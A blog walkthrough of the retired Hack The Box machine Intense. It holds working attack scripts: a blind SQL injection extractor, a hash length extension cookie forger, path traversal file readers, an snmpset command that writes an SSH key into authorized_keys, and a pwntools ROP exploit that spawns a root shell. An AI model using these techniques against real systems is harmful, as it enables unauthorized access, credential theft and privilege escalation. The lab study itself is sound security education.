---
layout: post  
title: "Intense: Hack The Box Walkthrough"
date: 2020-11-15 14:58:49 +0000
last_modified_at: 2020-11-15 14:58:49 +0000
category: Walkthrough
tags: ["Hack The Box", Intense, retired, Linux, Hard]
comments: true
protect: false
image:
  feature: intense-htb-walkthrough.png
---

This post documents the complete walkthrough of Intense, a retired vulnerable [VM][1] created by [sokafr][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Intense is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.195 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-07-06 04:45:20 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.195
Discovered open port 161/udp on 10.10.10.195
Discovered open port 80/tcp on 10.10.10.195
```

It appears that we have SNMP. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -sS -sU -pT:22,80,U:161 -A --reason 10.10.10.195 -oN nmap.txt
...
PORT    STATE SERVICE REASON              VERSION
22/tcp  open  ssh     syn-ack ttl 63      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b4:7b:bd:c0:96:9a:c3:d0:77:80:c8:87:c6:2e:a2:2f (RSA)
|   256 44:cb:fe:20:bb:8d:34:f2:61:28:9b:e8:c7:e9:7b:5e (ECDSA)
|_  256 28:23:8c:e2:da:54:ed:cb:82:34:a1:e3:b2:2d:04:ed (ED25519)
80/tcp  open  http    syn-ack ttl 63      nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods:
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Intense - WebApp
161/udp open  snmp    udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: f20383648c26d05d00000000
|   snmpEngineBoots: 624
|_  snmpEngineTime: 3m45s
| snmp-sysdescr: Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
|_  System uptime: 3m45.15s (22515 timeticks)
```

Awesome. Looks like we really have SNMP on our hands.

### Simple Network Management Protocol

Let's see what we can find with `snmp-check`.

```
# snmp-check -c public 10.10.10.195
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.10.195:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.10.195
  Hostname                      : intense
  Description                   : Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
  Contact                       : Me <user@intense.htb>
  Location                      : Sitting on the Dock of the Bay
  Uptime snmp                   : 02:22:39.70
  Uptime system                 : 00:02:46.02
  System date                   : 2020-7-6 09:57:48.0

```

Nothing useful it seems.

### Hypertext Transfer Protocol

Here's what the `http` service looks like.

{% include image.html image_alt="dc856f1a.png" image_src="/d6c24de1-704b-4907-af66-242191337928/dc856f1a.png" %}

Upon logging in with (`guest:guest`), this is what I get.

{% include image.html image_alt="747d3c2b.png" image_src="/d6c24de1-704b-4907-af66-242191337928/747d3c2b.png" %}

The creator was kind enough to leave the source code of the web application at `/src.zip`.

### Source Code Review

I noticed `/submitmessage` is the only route that doesn't require authentication, so this has a high chance of being the way in.

{% include image.html image_alt="bdf91824.png" image_src="/d6c24de1-704b-4907-af66-242191337928/bdf91824.png" %}

Notice the use of Python format string operation instead of parameter substitution? According to Python's `sqlite3` [module](https://docs.python.org/3.8/library/sqlite3.html),

> You shouldn’t assemble your query using Python’s string operations because doing so is insecure; it makes your program vulnerable to an SQL injection attack.

The only caveats are: 1) the SQL injection string must not be more than 140 characters long and 2) it must not contain these words.

{% include image.html image_alt="73b0e28e.png" image_src="/d6c24de1-704b-4907-af66-242191337928/73b0e28e.png" %}

### Database Schema

This is the schema I got from reading the source code.

```
CREATE TABLE users(
username TEXT NOT NULL,
secret TEXT NOT NULL,
role INT NOT NULL);
CREATE TABLE messages(
message text not null);
```

### SQL Injection

By making use of the following SQL injection payload, I was able to tease out `admin`'s `secret` hash (SHA256 of the password) from the `users` table. `admin` has a role of 1, obviously.

<div class="filename"><span>get_secret.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.195
PORT=80

# query database
function query() {
    local pos="$1"
    local chr="$2"
    local err="zeroblob(999999999)"
    local payload="'||(select case when substr((select secret from users where role=1),POS,1)='CHR' then ERR else 1 end from users))--"
    payload="${payload/POS/$pos}"
    payload="${payload/CHR/$chr}"
    payload="${payload/ERR/$err}"
    local result=$(curl -s \
                        --data-urlencode "message=${payload}" \
                        http://$HOST:$PORT/submitmessage)
    echo $result
}

SECRET=""

# SHA256 has 64 characters; and each character should be [0-9a-f]
for pos in $(seq 64); do
    for chr in {0..9} {a..f}; do
        if [ "$(query $pos $chr)" != "OK" ]; then
            SECRET="${SECRET}${chr}"
            break
        fi
    done
    printf "%02d: %s\n" "$pos" "$SECRET"
done
```

Let's run it, shall we?

```
# ./get_secret.sh
01: f
02: f1
03: f1f
04: f1fc
05: f1fc1
06: f1fc12
07: f1fc120
08: f1fc1201
09: f1fc12010
10: f1fc12010c
11: f1fc12010c0
12: f1fc12010c09
13: f1fc12010c094
14: f1fc12010c0940
15: f1fc12010c09401
16: f1fc12010c094016
17: f1fc12010c094016d
18: f1fc12010c094016de
19: f1fc12010c094016def
20: f1fc12010c094016def7
21: f1fc12010c094016def79
22: f1fc12010c094016def791
23: f1fc12010c094016def791e
24: f1fc12010c094016def791e1
25: f1fc12010c094016def791e14
26: f1fc12010c094016def791e143
27: f1fc12010c094016def791e1435
28: f1fc12010c094016def791e1435d
29: f1fc12010c094016def791e1435dd
30: f1fc12010c094016def791e1435ddf
31: f1fc12010c094016def791e1435ddfd
32: f1fc12010c094016def791e1435ddfdc
33: f1fc12010c094016def791e1435ddfdca
34: f1fc12010c094016def791e1435ddfdcae
35: f1fc12010c094016def791e1435ddfdcaec
36: f1fc12010c094016def791e1435ddfdcaecc
37: f1fc12010c094016def791e1435ddfdcaeccf
38: f1fc12010c094016def791e1435ddfdcaeccf8
39: f1fc12010c094016def791e1435ddfdcaeccf82
40: f1fc12010c094016def791e1435ddfdcaeccf825
41: f1fc12010c094016def791e1435ddfdcaeccf8250
42: f1fc12010c094016def791e1435ddfdcaeccf8250e
43: f1fc12010c094016def791e1435ddfdcaeccf8250e3
44: f1fc12010c094016def791e1435ddfdcaeccf8250e36
45: f1fc12010c094016def791e1435ddfdcaeccf8250e366
46: f1fc12010c094016def791e1435ddfdcaeccf8250e3663
47: f1fc12010c094016def791e1435ddfdcaeccf8250e36630
48: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c
49: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0
50: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0b
51: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc
52: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc9
53: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93
54: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc932
55: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc9328
56: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285
57: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c
58: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2
59: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c29
60: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c297
61: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971
62: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c29711
63: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c297110
64: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
```

Sweet.

### Hash Length Extension Attack

Too bad I could not crack the hash to recover the password. However, we can replay a session to gain access as `admin`. According to the source, the session is encoded as a cookie in this format.

```python
def create_cookie(session):
    cookie_sig = sign(session)
    return b64encode(session) + b'.' + b64encode(cookie_sig)
```

The part before the dot is the session and the part after the dot is the signature. The session is no more than the the key-value pair of `user=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;`. The signature is the SHA256 hash of a random secret between 8 and 15 characters, concatenated with the session.

According to [Wikipedia](https://en.wikipedia.org/wiki/Length_extension_attack),

> In cryptography and computer security, a **length extension attack** is a type of attack where an attacker can use **Hash**(_message1_) and the length of _message1_ to calculate **Hash**(_message1_ ‖ _message2_) for an attacker-controlled _message2_, without needing to know the content of _message1_.

Check out the `sign` function.

```python
def sign(msg):
	""" Sign message with secret key """
	return sha256(SECRET + msg).digest()
```

Looks like we have all the known variables to launch this attack to get the signature. Armed with this insight, I wrote a simple script that'll generate all valid cookies for the random secret between 8 and 15 characters. The main driver doing all the heavy lifting for this script is [`hash_extender`](https://github.com/iagox86/hash_extender).

<div class="filename"><span>get_cookie.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.195
PORT=80
LEN=$1

COOKIE=$(curl -i \
              -s \
              -d "username=guest&password=guest" \
              http://$HOST:$PORT/postlogin \
         | grep -E 'Set-Cookie' \
         | sed 's/Set-Cookie: //' \
         | cut -d';' -f1 \
         | sed 's/auth=//')

DATA=$(cut -d'.' -f1 <<<$COOKIE | base64 -d)
SIGN=$(cut -d'.' -f2 <<<$COOKIE | base64 -d | xxd -p | tr -d '\n')

SECRET=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
APPEND=";username=admin;secret=${SECRET};"

for LEN in $(seq 8 15); do
    HASH=$(./hash_extender -d $DATA \
                           -a $APPEND \
                           -s $SIGN \
                           -l $LEN)

    NEWSIG=$(sed '3!d' <<<$HASH \
             | cut -d':' -f2 \
             | sed 's/^ //' \
             | xxd -p -r | base64 -w0)

    NEWSTR=$(sed '4!d' <<<$HASH \
             | cut -d':' -f2 \
             | sed 's/^ //' \
             | xxd -p -r \
             | base64 -w0)

    CODE=$(curl -s \
                -H "Cookie: auth=${NEWSTR}.${NEWSIG}" \
                -o /dev/null \
                -w %{http_code} \
                http://$HOST:$PORT/admin)

    if [ $CODE -eq 200 ]; then
        echo auth=${NEWSTR}.${NEWSIG}
        break
    fi
done
```

Time to test it out.

```
# ./get_cookie.sh
auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQO3VzZXJuYW1lPWFkbWluO3NlY3JldD1mMWZjMTIwMTBjMDk0MDE2ZGVmNzkxZTE0MzVkZGZkY2FlY2NmODI1MGUzNjYzMGMwYmM5MzI4NWMyOTcxMTA1Ow==.QjB4SL+mnsbrBBudsI8Jan61l7I1l3qMY/0uA0UJXCk=
```

Replace the browser's cookie with the output above.

{% include image.html image_alt="ab33f96d.png" image_src="/d6c24de1-704b-4907-af66-242191337928/ab33f96d.png" %}

Sweet.

### Listing and reading files

We can make use of the traversal vulnerability in `/admin/log/dir` and `/admin/log/view` routes to list and read files respectively, by expanding on the output from `get_cookie.sh`.

#### List files

<div class="filename"><span>dir.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.195
PORT=80
DIR=$1

curl -s \
     -b $(./get_cookie.sh) \
     -d "logdir=../../../../..${DIR}/." \
     http://$HOST:$PORT/admin/log/dir \
| tr ',' '\n' \
| tr -d " []'" \
| sort
```

{% include image.html image_alt="6ce4b05c.png" image_src="/d6c24de1-704b-4907-af66-242191337928/6ce4b05c.png" %}

#### Read files

<div class="filename"><span>read.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.195
PORT=80
FILE=$1

curl -s \
     -b $(./get_cookie.sh) \
     -d "logfile=../../../../..${FILE}" \
     http://$HOST:$PORT/admin/log/view
```

{% include image.html image_alt="48a75be8.png" image_src="/d6c24de1-704b-4907-af66-242191337928/48a75be8.png" %}

### Getting `user.txt`

While we are at it, we can list `user`'s home directory like so.

{% include image.html image_alt="34165bdb.png" image_src="/d6c24de1-704b-4907-af66-242191337928/34165bdb.png" %}

What's even more amazing is that we have the permissions to read `user.txt`!

{% include image.html image_alt="34fe584c.png" image_src="/d6c24de1-704b-4907-af66-242191337928/34fe584c.png" %}

### Net-SNMPd Write Access SNMP-EXTEND-MIB arbitrary code execution

Let's see what else is there especially SNMP. It must be there for a reason, right? This is where the configuation file of `net-snmp` is kept.

{% include image.html image_alt="d084009f.png" image_src="/d6c24de1-704b-4907-af66-242191337928/d084009f.png" %}

Now check out `/etc/snmp/snmpd.conf`.

{% include image.html image_alt="8da15fb4.png" image_src="/d6c24de1-704b-4907-af66-242191337928/8da15fb4.png" %}

We know that SNMP-EXTEND-MID is in-place because of this.

{% include image.html image_alt="2d7a644e.png" image_src="/d6c24de1-704b-4907-af66-242191337928/2d7a644e.png" %}

## Foothold

Armed with the RW community string `SuP3RPrivCom90` and the knowledge that SNMP-EXTEND-MIB is enabled, we can utilize `metasploit` to launch a `meterpreter` to gain a foothold into the remote machine like so.

{% include image.html image_alt="8706f282.png" image_src="/d6c24de1-704b-4907-af66-242191337928/8706f282.png" %}

Running the exploit should produce a `meterpreter` session.

{% include image.html image_alt="6a1816c9.png" image_src="/d6c24de1-704b-4907-af66-242191337928/6a1816c9.png" %}

Getting shell is easy.

{% include image.html image_alt="abf3af4e.png" image_src="/d6c24de1-704b-4907-af66-242191337928/abf3af4e.png" %}

We'd better [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) the shell to full TTY.

## Privilege Escalation

During enumeration of `Debian-snmp`'s account, I notice that `note_server` is running on listening on `5001/tcp` at the loopback interface as `root`. Given that `note_server.c` is available, exploiting `note_server` must be the ticket to pwning the box.

{% include image.html image_alt="a780dbef.png" image_src="/d6c24de1-704b-4907-af66-242191337928/a780dbef.png" %}

### Port Forwarding

Now that we know `note_server` is running behind `5001/tcp`, we can use the port-forwarding feature in `meterpreter` like so.

{% include image.html image_alt="81c0bfb3.png" image_src="/d6c24de1-704b-4907-af66-242191337928/d5bf50e6.png" %}

Alternatively, we can utilize `snmpset` to write a SSH public key we control to `Debian-snmp`'s `authorized_keys`. Prior to that, I've already established that `/var/lib/snmp/.ssh/authorized_keys` exists. I wrote a simple shell script to do that.

<div class="filename"><span>ssh.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.195
RW=SuP3RPrivCom90

ssh-keygen -t ed25519 -f snmp

snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c $RW $HOST \
"nsExtendStatus.\"ssh\"" = createAndGo \
"nsExtendCommand.\"ssh\"" = /bin/bash \
"nsExtendArgs.\"ssh\"" = "-c \"echo $(cat snmp.pub) >> ~/.ssh/authorized_keys\""
```

Note that I generated a SSH keypair using `ed25519` because it has a shorter pubkey string, otherwise SNMP will complain like so.

```
nsExtendArgs."ssh": Value out of range (Value does not match DISPLAY-HINT :: {(0..255)})
```

### File Analysis of `note_server`

Let's make a note of the `libc` version used in `note_server`.

{% include image.html image_alt="8029f1b0.png" image_src="/d6c24de1-704b-4907-af66-242191337928/8029f1b0.png" %}

OK. That's the same as [libc6_2.27-3ubuntu1_amd64.so](https://libc.blukat.me/d/libc6_2.27-3ubuntu1_amd64.so). Let's download a copy; we'll be needing it later when we start to develop the exploit.

Looking at the source code, we notice that the program is compiled with all the security protections.

```
# gcc -Wall -pie -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro note_server.c -o note_server
```

Check out `checksec` in `gef`.

{% include image.html image_alt="9623285f.png" image_src="/d6c24de1-704b-4907-af66-242191337928/9623285f.png" %}

### Vulnerability Analysis of `note_server`

Although `note_server` has almost all the security protections, the source code provides vulnerable primitives that allow us to write into a 1024-byte buffer, copy any segment (by offset and size) of the buffer to the end of it, and write the contents of the buffer to the socket.

### Exploit Development of `note_server`

Armed with the insights, here's my exploit code.

```python
from pwn import *

context(os='linux', arch='amd64')

host = '127.0.0.1'
port = 5001
fd = 4

def write_note(io, note, length=None):
    if length is None:
        length = len(note)

    io.send(p8(1))
    io.send(p8(length))
    io.send(note)

def copy_note(io, offset, copySize):
    io.send(p8(2))
    io.send(p16(offset))
    io.send(p8(copySize))

def read_notes(io, size=None):
    io.send(p8(3))
    if size is None:
        recv = io.recvall()
    else:
        recv = io.recv(size)
    return recv

def write_to_end(io, written=0):
    g = cyclic_gen()
    while written < 1024:
        chunk = min(255, 1024 - written)
        write_note(io, g.get(chunk))
        written += chunk

def do_rop(io, canary, rbp, rop):
    buf = p64(0xDEAD)
    buf += p64(canary)
    buf += p64(rbp)
    buf += rop.chain()

    write_note(io, buf)
    write_to_end(io, len(buf))
    copy_note(io, 0, len(buf))
    read_notes(io, 1024 + len(buf))

def stage1():
    # stack canary + ebp
    io = remote(host,port)
    write_to_end(io)

    read_size = 4*8
    copy_note(io, 1024, read_size)
    leak = read_notes(io, 1024+read_size)[1024:]
    canary = u64(leak[8:16])
    rbp = u64(leak[16:24])
    rip = u64(leak[24:])

    print("\nleaks:")
    print("rbp = ", hex(rbp))
    print("canary = ", hex(canary))
    print("rip = ", hex(rip))
    io.close()
    return (rbp, canary, rip)

def stage2(rbp, canary, rip):
    # leaking libc
    base_address = rip - 0xf54 # return address - offset (objdump -D -Mintel note_server)
    elf = ELF("./note_server", checksec=False)
    elf.address = base_address
    rop = ROP(elf)
    rop.write(fd, elf.got["write"])
    io = remote(host, port)
    do_rop(io, canary, rbp, rop)
    leak = io.recv(8)         
    libc_write = u64(leak)
    print("\nlibc leak: " + hex(libc_write))
    io.close()
    return libc_write

def stage3(canary, rbp, libc_write_leak):
    elf_libc = ELF("./libc6_2.27-3ubuntu1_amd64.so", checksec=False)
    elf_libc.address = libc_write_leak - elf_libc.symbols['write']
    rop_libc = ROP(elf_libc)
    rop_libc.dup2(fd, 0)
    rop_libc.dup2(fd, 1)
    rop_libc.execve(next(elf_libc.search(b"/bin/sh\x00")), 0, 0)

    io = remote(host, port)
    do_rop(io, canary, rbp, rop_libc)

    io.interactive()

(rbp, canary, rip) = stage1()
libc_write_leak = stage2(rbp, canary, rip)
stage3(canary, rbp, libc_write_leak)
```

### Getting `root.txt`

Let's give it a shot.

{% include image.html image_alt="a81c557c.png" image_src="/d6c24de1-704b-4907-af66-242191337928/a81c557c.png" %}

Sweet.

{% include image.html image_alt="7398b6c9.png" image_src="/d6c24de1-704b-4907-af66-242191337928/7398b6c9.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/261
[2]: https://www.hackthebox.eu/home/users/profile/19014
[3]: https://www.hackthebox.eu/
